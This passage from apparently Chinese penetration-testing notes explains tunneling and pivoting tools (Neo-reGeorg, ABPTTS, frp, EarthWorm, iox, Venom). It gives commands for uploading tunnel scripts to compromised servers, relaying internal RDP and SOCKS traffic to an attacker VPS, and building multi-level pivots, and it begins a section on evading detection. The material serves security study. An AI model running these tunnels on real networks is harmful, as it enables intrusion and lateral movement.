避免特征检测</li><li>http头可定制化</li><li>多url随机请求</li><li>兼容py2 3</li></ul></li><li>使用<ul><li>python3 neoreg.py generate -k e9RzHa523NkPvJUp</li><li>会创建目录 并生成代理脚本</li><li>上传即可</li><li>然后使用neoreg.py 执行如下命令连接代理文件 proxifier代理即可</li><li>python neoreg.py -l 0.0.0.0 -p 1080 -k dawn -u <a href="https://breakbox.hr/tunnel.php">https://breakbox.hr/tunnel.php</a></li><li>需要注意的是 用自己秘钥生成的 是新的一个文件夹 而不是那个模板文件夹<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240929114328312.png" alt="image-20240929114328312"></li></ul></li><li>自定义访问页面<ul><li>可以先自己随便新建一个404.html文件</li><li>把文件放在neoreg.py同级目录下</li><li>生成脚本的时候 执行如下命令<ul><li>python3 neoreg.py generate -k e9RzHa523NkPvJUp –file 404.html –httpcode 404</li><li>也可以自己把脚本文件名字更改 然后连接的时候加上–skip忽略错误即可<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240929114316597.png" alt="image-20240929114316597"></li></ul></li></ul></li></ul><p><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240929114420156.png" alt="image-20240929114420156"></p><h4 id="ABPTTS"><a href="#ABPTTS" class="headerlink" title="ABPTTS"></a>ABPTTS</h4><ul><li><p>一款基于ssl加密的http端口转发工具 全程数据加密 稳定 py2编写 但是该工具仅仅支持apsx和jsp</p></li><li><p>项目地址：<a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p></li><li><p>依赖</p><ul><li>pip2 install pycrypto <ul><li>py -2 -m pip install pycrypto</li></ul></li><li>pip2 install httplib2<ul><li>py -2 -m pip install httplib2</li></ul></li></ul></li><li><p>使用</p><ul><li>python2 abpttsfactory.py -o webshell</li></ul></li><li><p>同样上传目标服务器可解析目录<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240929121142341.png" alt="image-20240929121142341"><br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240929121154697.png" alt="image-20240929121154697"></p><ul><li>需要注意的是 打开这个jsp可以看到里边写了支持的jdk版本 一般业务用的都会支持</li><li>复现的时候也需要用被支持的 例如jdk8</li></ul></li><li><p>然后执行以下命令 即可转发端口 3389</p><ul><li>#windows <ul><li>python2 abpttsclient.py -c webshell\config.txt -u <a href="http://192.168.225.128:8080/abptts.jsp">http://192.168.225.128:8080/abptts.jsp</a> -f 127.0.0.1:3389&#x2F;192.168.225.128:3389 –unsafetls</li></ul></li><li>linux&#x2F;mac<ul><li>python2 abpttsclient.py -c webshell&#x2F;&#x2F;config.txt -u <a href="http://10.211.55.3:8080/shiro/abptts.jsp">http://10.211.55.3:8080/shiro/abptts.jsp</a> -f 127.0.0.1:3389&#x2F;10.211.55.3:3389 –unsafetls</li></ul></li><li>连接本地3389即可<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240929141444455.png" alt="image-20240929141444455"></li></ul></li></ul><h4 id="reDuh"><a href="#reDuh" class="headerlink" title="reDuh"></a>reDuh</h4><ul><li>是一款把tcp流量封装在http流量中的工具</li><li>项目地址：<a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></li><li>先把项目中的服务端文件夹的脚本文件上传<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240929141743464.png" alt="image-20240929141743464"></li><li>本地执行 java -jar reDuhClient.jar <a href="http://192.168.176.253:8080/reDuh.jsp">http://192.168.176.253:8080/reDuh.jsp</a></li><li>再开一个cmd 使用nc监听本地1010端口</li><li>然后执行命令<ul><li>nc -vv localhost 1010</li><li>[createTunnel]33389:127.0.0.1:3389</li></ul></li><li>然后连接本地33389就是目标内网3389</li><li>注意端口是否被占用</li></ul><h3 id="反向代理-1"><a href="#反向代理-1" class="headerlink" title="反向代理"></a>反向代理</h3><h4 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h4><ul><li>项目地址：<a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></li></ul><h4 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h4><p>fast reverse proxy 是一款隧道工具 使用go开发 是一款反向代理工具 可以内网穿透，对外网提供服务。且支持多台client进行负载均衡。</p><p>frp支持 tcp、udp、http、https等</p><p>并且支持web服务器根据域名做路由转发</p><p>项目地址：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>多协议</p><p>端口复用 多个服务通过一个服务端端口暴露</p><p>多个原生客户端插件</p><p>高拓展性服务端插件系统</p><p>服务端和客户端ui界面</p><h5 id="frp的代理类型"><a href="#frp的代理类型" class="headerlink" title="frp的代理类型"></a>frp的代理类型</h5><ul><li>tcp</li><li>kcp 适合较差的网络环境 建议默认开启</li><li>udp</li><li>http<ul><li>可以修改host header等</li></ul></li><li>https<ul><li>一些额外功能</li></ul></li><li>stcp<ul><li>安全的tcp内网代理，需要在被访问者和访问者的机器上都部署frpc，不需要在服务端暴露端口</li></ul></li><li>sudp<ul><li>安全的udp内网代理，需要在被访问者和访问者的机器上都部署frpc，不需要在服务端暴露端口</li></ul></li><li>xtcp<ul><li>点对点内网穿透代理，功能如同stcp，但是流量不需要经过服务器中转</li></ul></li><li>tcpmux<ul><li>支持服务端tcp端口的多路复用，通过一个端口访问不同的内网服务</li></ul></li></ul><h5 id="frp的配置文件"><a href="#frp的配置文件" class="headerlink" title="frp的配置文件"></a>frp的配置文件</h5><ul><li>服务端配置<ul><li>基础配置</li></ul></li><li>客户端配置</li></ul><h5 id="frp的使用"><a href="#frp的使用" class="headerlink" title="frp的使用"></a>frp的使用</h5><ul><li><p>校验配置文件</p><ul><li>.&#x2F;frps verify -c .&#x2F;frps.ini</li><li>.&#x2F;frpc verify -c .&#x2F;frpc.ini</li></ul></li><li><p>使用frp建立隧道（反向socks5代理）</p><ul><li><p>场景如下</p><ul><li>我们获得了一个位于内网的通过NAT 方式对外提供服务的主机的权限，现在我们需要对其所在的内网继续进行渗透。于是，我们就需要通过FRP 建立一个隧道，让我们的主机可以通过隧道访问其内网。</li></ul></li></ul></li></ul><p><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240929160021598.png" alt="image-20240929160021598"></p><ul><li><p>配置文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7777</span><br><span class="hljs-attr">token</span> = vw50kfc<br><br><span class="hljs-section">[test]</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">12345</span><br><span class="hljs-attr">plugin</span> = socks5<br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">13.188</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7777</span><br><span class="hljs-attr">health_check_type</span> = tcp<br><span class="hljs-attr">health_check_interval_s</span> = <span class="hljs-number">100</span><br><span class="hljs-attr">token</span> = vw50kfc<br><span class="hljs-attr">pool_count</span> = <span class="hljs-number">5</span><br><br><span class="hljs-section">[test]</span><br><span class="hljs-attr">plugin</span> = socks5<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">12345</span><br><span class="hljs-attr">plugin_user</span> = admin<br><span class="hljs-attr">plugin_passwd</span> = admin@<span class="hljs-number">123</span><br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure></li><li><p>本机</p><ul><li>用proxifier设置代理填入账号密码即可</li></ul></li><li><p>查看dashboard</p><ul><li>服务端7001端口</li></ul></li></ul><h5 id="使用frp映射web服务"><a href="#使用frp映射web服务" class="headerlink" title="使用frp映射web服务"></a>使用frp映射web服务</h5><ul><li>和映射全部一样 只是端口区别</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">13.188</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7777</span><br><span class="hljs-attr">token</span> = vw50kfc<br><br><span class="hljs-section">[web]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">80</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">8080</span><br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h5 id="映射rdp或者ssh等特定端口"><a href="#映射rdp或者ssh等特定端口" class="headerlink" title="映射rdp或者ssh等特定端口"></a>映射rdp或者ssh等特定端口</h5><ul><li>服务端配置基本不变 客户端改变协议 端口</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">13.188</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7777</span><br><span class="hljs-attr">token</span> = vw50kfc<br><br><span class="hljs-section">[rdp]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">3389</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">33890</span><br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br><br><span class="hljs-section">[ssh]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">22</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">2222</span><br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h5 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h5><ul><li>适合在内网拿下多台主机条件 防止单台机器流量压力过大、代理突然中断造成影响</li><li>把不同client 分配到同一个group即可</li><li>服务端配置</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">dashboard_port</span> = <span class="hljs-number">7500</span><br><span class="hljs-attr">dashboard_user</span> = admin<br><span class="hljs-attr">dashboard_pwd</span> = password<br><br><span class="hljs-comment"># 开启负载均衡</span><br><span class="hljs-attr">token</span> = vw50kfc<br></code></pre></td></tr></table></figure><ul><li>客户端配置</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = &lt;server-ip&gt;<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = vw50kfc<br><br><span class="hljs-section">[web1]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">8081</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">9000</span>//不同客户端的该参数需要相同<br><span class="hljs-attr">group</span> = web<br><span class="hljs-attr">group_key</span> = load-balance//不同客户端的该参数需要相同<br></code></pre></td></tr></table></figure><p>不同client的group_key 需要相同 表示在同一个group内</p><h4 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h4><p>ew全程 EarchWorm，是一套网络穿透工具，基于c开发，有socks5代理、端口转发、端口映射三大功能，可在复杂网络环境下完成网络穿透，支持全平台。</p><h5 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h5><p>ew有六种模式</p><ul><li>ssocksd 用于普通网络环境下的正向连接</li><li>rcsocks 用于反向连接</li><li>rssocks 用于反向连接</li><li>lcx_slave 用于复杂网络环境的多级连接</li><li>lcx_listen 用于复杂网络环境的多级连接</li><li>lcx_tran 用于复杂网络环境的多级连接<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930164030580.png" alt="image-20240930164030580"></li></ul><h5 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h5><ul><li>-l 指定要监听的本地端口</li><li>-d 指定要反弹到的机器ip</li><li>-e 指定要反弹到的机器端口</li><li>-f 指定要主动连接的机器ip</li><li>-g 指定要主动连接的机器端口</li><li>-t 指定超时时长，默认为1000</li></ul><h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p>正向代理</p><ul><li>.&#x2F;ew_for_linux64 -s ssocksd -l 1080</li><li>proxifier配置连接即可<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930164335987.png" alt="image-20240930164335987"></li></ul><p>反向代理</p><ul><li>vps上开启监听 将1080端口监听的流量全部转发到8889端口</li><li>.&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 8889</li><li>目标机器<ul><li>将本地所有的流量都转发到vps的8889端口</li></ul></li><li>ew.exe -s rssocks -d 47.236.228.126 -e 8889<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930165112729.png" alt="image-20240930165112729"></li></ul><p>二级代理</p><ul><li>此时情况更加复杂 内网主机A能出网 内网主机B不能出网，但是内网主机B可以访问靶标 而内网主机A不能访问靶标 但是A与B是相互连接的 我们已经拿到了A和B的权限<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930165323861.png" alt="image-20240930165323861"></li><li>vps开启监听 转发流量<ul><li>.&#x2F;ew_for_linux64 -s lcx_listen -l 1080 -e 8887</li></ul></li><li>主机B上执行 监听本地9999端口<ul><li>ew.exe -s ssocksd -l 9999</li></ul></li><li>主机A上执行 把vps的8888端口和服务器B的9999端口连接<ul><li>.&#x2F;ew_for_linux64 -s lcx_slave -d 47.236.228.126 -e 8888 -f 192.168.250.128 -g 9999</li></ul></li><li>之后设置proxifier为vps的1080 即可访问靶标<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930170016451.png" alt="image-20240930170016451"></li></ul><p>三级代理</p><ul><li>情况如下：内网主机A能够出网，内网主机B不能出网，内网主机C也不能出网。内网主机A只能访问内网主机B，内网主机B只能访问内网主机A和内网主机C，内网主机C可以访问到内网主机B也能访问到靶标。 我们现在拥有内网主机A、内网主机B、内网主机C的权限。<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930170712215.png" alt="image-20240930170712215"></li><li>第一步 vps上执行 ，将本地1080流量转发到8887端口<ul><li>.&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 8887</li></ul></li><li>内网主机a执行 外联到vps的8887端口 内联到隔壁B的9999端口 实现他们之间的流量转发<ul><li>.&#x2F;ew_for_linux64 -s lcx_slave -d 47.236.228.126 -e 8887 -f 192.168.250.128 -g 9999</li></ul></li><li>内网主机b执行 监听本地的9999端口 把vps的流量拿到手 然后放到7777端口上<ul><li>ew.exe -s lcx_listen -l 9999 -e 7777</li></ul></li><li>内网主机c执行 把隔壁b的7777端口的流量拿到自己手上<ul><li>ew.exe -s rssocks -d 192.168.225.136 -e 7777</li></ul></li><li>最后 proxifier配置即可<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930171637630.png" alt="image-20240930171637630"></li></ul><h4 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h4><p>功能类似lcx 、ew 但是比他们更好用。</p><ul><li>iox特性<ul><li>流量加密 （可选）</li><li>友好的命令行参数</li><li>udp流量转发</li><li>反向代理模式中使用tcp多路复用</li></ul></li></ul><h5 id="iox的参数"><a href="#iox的参数" class="headerlink" title="iox的参数"></a>iox的参数</h5><ul><li>-l 监听本地的端口 带*意味着流量加密</li><li>-r 连接远程主机的端口 带*意味着流量加密</li><li>-k 十六进制格式键 用于生成键和IV</li><li>-u udp转发模式</li><li>-t 设置连接超时时间</li><li>-v 开启日志帮助</li><li>-h 查看帮助</li></ul><h5 id="iox的使用"><a href="#iox的使用" class="headerlink" title="iox的使用"></a>iox的使用</h5><p>工作模式</p><ul><li>fwd转发模式<ul><li>监听本地8888端口和9999端口 将两个链接之间的流量进行转发</li><li>.&#x2F;iox fwd -l 8888 -l 9999</li><li>#监听本地 8888 端口和 9999 端口，将两个连接间的流量进行转发，流量加密</li><li>.&#x2F;iox fwd -l *8888 -l *9999 -k 656565</li><li>#监听本地 8888 端口将流量转发到 39.99.251.19 机器的 9999 端口</li><li>.&#x2F;iox fwd -l 8888 -r 39.99.251.19:9999</li><li>#监听本地 8888 端口将流量转发到 39.99.251.19 机器的 9999 端口，流量加密</li><li>.&#x2F;iox fwd -l *8888 -r *39.99.251.19:9999 -k 656565</li><li>#连接 39.99.251.19:8888 和 39.99.251.19:9999, 在两个连接间转发流量</li><li>.&#x2F;iox fwd -r 39.99.251.19:8888 -r 39.99.251.19:9999</li><li>#连接 39.99.251.19:8888 和 39.99.251.19:9999, 在两个连接间转发流量，流量加密</li><li>.&#x2F;iox fwd -r *39.99.251.19:8888 -r *39.99.251.19:9999 -k 656565</li></ul></li><li>将内网主机的rdp端口转发到vps上<ul><li>现在有这么一个场景，我们获得了位于内网的一台主机的权限，并且知道了他的登录用户名和密码。他的 3389 端口只对内网开放，现在我们需要将该主机的3389 端口映射到公网我们的 VPS 的 3389 端口，那样，我们连接我们VPS的3389 端口就相当于连接内网主机的 3389 端口了<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930172847277.png" alt="image-20240930172847277"></li><li>vps执行<ul><li>.&#x2F;iox fwd -l *9999 -l 3389 -k 656565</li></ul></li><li>目标机器执行<ul><li>iox.exe fwd -r 192.168.254.1:3389 -r *47.236.228.126:9999 -k 656565</li></ul></li><li>然后连接vps的3389端口即可<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930174442641.png" alt="image-20240930174442641"></li><li>注意： 被控主机和vps:8888之间的流量会被加密 预共享的秘钥是’AAA’，iox会用这个秘钥生成种子和nonce，并用Xchacha20流加密</li></ul></li><li>proxy代理模式<ul><li>socks5反向代理<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930173103835.png" alt="image-20240930173103835"><ul><li>vps执行<ul><li>.&#x2F;iox proxy -l *9999 -l *1080 -k 656565</li></ul></li><li>目标机器执行<ul><li>iox.exe proxy -r *47.236.228.126:9999 -k 656565</li></ul></li><li>proxifier链接即可</li><li>但是本地没有复现成功</li></ul></li><li>socks5正向代理<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930173139017.png" alt="image-20240930173139017"><ul><li>目标机器执行.&#x2F;iox proxy -l 1080</li><li>proxifier设置即可<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20240930180054344.png" alt="image-20240930180054344"></li></ul></li></ul></li></ul><h4 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h4><p>Venom 是一款为渗透测试人员设计的使用Go开发的多级代理工具，Venom可以将多个节点进行连接，然后以节点为跳板，构建多级代理。渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点。</p><p>项目地址：<a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><h5 id="agent节点使用"><a href="#agent节点使用" class="headerlink" title="agent节点使用"></a>agent节点使用</h5><ul><li>在admin打开了监听之后<ul><li>.\agent.exe -rhost 47.236.228.126 -rport 9998 即可连接</li></ul></li></ul><h5 id="admin节点使用"><a href="#admin节点使用" class="headerlink" title="admin节点使用"></a>admin节点使用</h5><ul><li>-h 显示帮助<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001133420633.png" alt="image-20241001133420633"></li><li>show显示网络拓扑<ul><li>A表示admin节点 数字表示agent节点<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001135243739.png" alt="image-20241001135243739"></li></ul></li><li>goto 操作某个节点<ul><li>goto 1</li></ul></li><li>getdes&#x2F;setdes 获取&#x2F;设置节点信息描述<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001135309329.png" alt="image-20241001135309329"></li><li>connect 主动连接<ul><li>首先在被控机上.&#x2F;agent.exe -lport 3333<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001135607147.png" alt="image-20241001135607147"></li></ul></li><li>listen反向连接<ul><li>在node1节点 监听7777端口 listen 7777 </li><li>然后在另一台机器上运行agent.exe -rhost ip -rport 7777 连接node1<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001135746133.png" alt="image-20241001135746133"></li></ul></li><li>sshconnect<ul><li>在想被ssh连接的机器上执行.&#x2F;agent_linux_x64 -lport 9999</li><li>node3通过sshconnect建立隧道连接 某个ip的6666端口 可以使用密码或者ssh私钥进行认证</li><li>sshconnect <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#x34;&#x37;&#46;&#x32;&#x33;&#54;&#46;&#x32;&#x32;&#x38;&#x2e;&#49;&#50;&#54;">root@47.236.228.126</a>:22 6666</li></ul></li><li>shell 获取节点的交互式shell<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001140202893.png" alt="image-20241001140202893"></li><li>upload&#x2F;download 向节点上传&#x2F;从节点下载文件<ul><li>upload &#x2F;tmp&#x2F;test.txt c:&#x2F;test.txt</li><li>将本地的tmp目录下test.txt 上传到node1的C:&#x2F;test.txt<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001140307828.png" alt="image-20241001140307828"></li></ul></li><li>socks建立到某个节点的socks5代理<ul><li>socks 7777</li><li>执行成功后会在admin节点本地开启一个端口 如上述7777，使用即可进行socks5代理<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001140557485.png" alt="image-20241001140557485"></li></ul></li><li>lforward将本地端口转发到远程<ul><li>lforward 将admin节点的8888端口转发到了node1的8888端口 也就是访问note1的8888端口相当于访问了admin节点的8888端口</li><li>lforward 127.0.0.1 5555 5555<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001140822127.png" alt="image-20241001140822127"></li></ul></li><li>rforward 将远程端口转发到本地<ul><li>rforward将note1（ip）节点的3389端口转发到了admin节点本地的3389<ul><li>也就是访问admin的3389 相当于访问了agent的3389</li><li>rforward 物理机ip 3434 3434<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001141021988.png" alt="image-20241001141021988"></li></ul></li></ul></li><li>一级代理<ul><li>反向socks5代理</li><li>服务端<ul><li>.&#x2F;admin_linux_x64 -lport 9999 -passwd iQ6gIPqDYytIgr2n</li></ul></li><li>客户端<ul><li>agent.exe -rhost 39.99.251.19 -rport 9999 -passwd iQ6gIPqDYytIgr2n</li></ul></li><li>proxifier 配置即可</li><li>正向socks5代理</li><li>客户端（拿下的服务器）<ul><li>.&#x2F;agent_linux_x64 -lport 8888</li></ul></li><li>服务端（本地）<ul><li>admin.exe -rhost 39.99.251.19 -rport 8888</li><li>goto过去 socks 1080</li><li>proxifier配置本地1080端口即可<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001141844525.png" alt="image-20241001141844525"></li></ul></li></ul></li><li>二级代理<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001131955825.png" alt="image-20241001131955825"><ul><li>vps上监听9999端口</li><li>主机A使用这个命令连接VPS的9999端口</li><li>主机B上监听9999端口</li><li>goto到主机A connect到B的9999端口</li><li>在note1节点连接主机B的9999端口 成功之后 切换到note2节点 开启socks5代理即可<ul><li>socks 1080<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001142354304.png" alt="image-20241001142354304"></li></ul></li></ul></li><li>三级代理<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001132109505.png" alt="image-20241001132109505"><ul><li>基于二级代理之后</li><li>在主机C上监听9999</li><li>然后切换到note2节点 连接主机C的9999端口 成功之后 切换到node3节点 开启socks5代理即可</li></ul></li><li>四级代理<br><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20241001132158596.png" alt="image-20241001132158596"><ul><li>基于三级代理之后 在D上监听9999</li><li>然后切换到node3节点 连接D的9999端口 成功后切换到node4节点 开启socks5代理即可</li></ul></li></ul><h2 id="特征修改"><a href="#特征修改" class="headerlink" title="特征修改"></a>特征修改</h2><h3 id="frp-1"><a href="#frp-1" class="headerlink" title="frp"></a>frp</h3><h3 id="项目结构了解"><a href="#项目结构了解" class="headerlink" title="项目结构了解"></a>项目结构了解</h3><p>一个常见go项目的结构</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 